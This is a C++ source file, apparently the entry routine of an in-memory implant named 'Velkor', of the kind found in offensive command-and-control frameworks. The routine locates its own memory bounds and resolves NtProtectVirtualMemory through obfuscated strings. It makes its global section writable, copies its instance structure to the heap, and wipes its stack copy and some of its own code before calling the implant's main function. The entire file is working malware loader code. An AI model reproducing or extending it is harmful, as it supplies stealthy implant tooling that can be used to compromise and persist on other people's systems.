#include <Velkor.h>

EXTERN_C D_SEC( B ) VOID Entry(
    PVOID Param
) {
    VELKOR   InstVelkor = { 0 };
    PVOID    Heap       = { 0 };
    PVOID    MmAddr     = { 0 };
    SIZE_T   MmSize     = { 0 };
    ULONG    Protect    = { 0 };

    VkMem::Zero( &InstVelkor, sizeof( InstVelkor ) );

    //
    // get the process heap handle from Peb
    //
    Heap = NtCurrentPeb()->ProcessHeap;

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //

    InstVelkor.VelkorMemory.Full.Start  = StartPtr();

    //
    // get the offset and address of our global instance structure
    //
    MmAddr = InstVelkor.VelkorMemory.Full.Start + InstanceOffset();
    MmSize = sizeof( PVOID );

    InstVelkor.VelkorMemory.Full.Length =  ( ( U_64( EndPtr() ) - U_64( InstVelkor.VelkorMemory.Full.Start ) ) + 4096 - 1 ) & ~( 4096 -1 );

    InstVelkor.VelkorMemory.RxPage.Start   = InstVelkor.VelkorMemory.Full.Start;
    InstVelkor.VelkorMemory.RxPage.Length  = U_64( MmAddr ) - U_64( InstVelkor.VelkorMemory.RxPage.Start );
    InstVelkor.VelkorMemory.RwPage.Start   = C_PTR( InstVelkor.VelkorMemory.RxPage.Start )   - U_64( InstVelkor.VelkorMemory.RxPage.Length );
    InstVelkor.VelkorMemory.RwPage.Length  = U_64( InstVelkor.VelkorMemory.Full.Length ) - U_64( InstVelkor.VelkorMemory.RxPage.Length );

    //
    // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
    // updating/patching the Instance in the current memory
    //
    if ( ( InstVelkor.Module[eNtdll] = LdrLoadModule( XprNtdll ) ) ) {
        if ( !( InstVelkor.FunctionPtr.NtProtectVirtualMemory = ( decltype(&NtProtectVirtualMemory) )LdrLoadFunc( InstVelkor.Module[eNtdll], XPR( "NtProtectVirtualMemory" ) ) )
        ) {
            return;
        }
    }

    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    if ( ! NT_SUCCESS( InstVelkor.FunctionPtr.NtProtectVirtualMemory(
        NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect
    ) ) ) {
        return;
    }

    //
    // assign heap address into the RW memory page
    //
    if ( ! ( C_DEF( MmAddr ) = VkMem::Heap::Alloc( sizeof( VELKOR ) ) ) ) {
        return;
    }

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    VkMem::Copy( C_DEF( MmAddr ), &InstVelkor, sizeof( VELKOR ) );
    VkMem::Zero( &InstVelkor, sizeof( InstVelkor ) );
    VkMem::Zero( C_PTR( U_64( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // now execute the implant entrypoint
    //
    Main( Param );
}
